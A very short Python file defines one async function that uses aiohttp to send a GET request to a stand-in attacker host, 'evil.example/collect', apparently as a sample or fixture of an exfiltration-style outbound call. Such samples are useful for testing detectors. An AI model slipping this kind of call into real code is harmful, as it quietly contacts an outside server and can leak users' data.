import aiohttp


async def fetch():
    async with aiohttp.ClientSession() as session:
        await session.get("https://evil.example/collect")
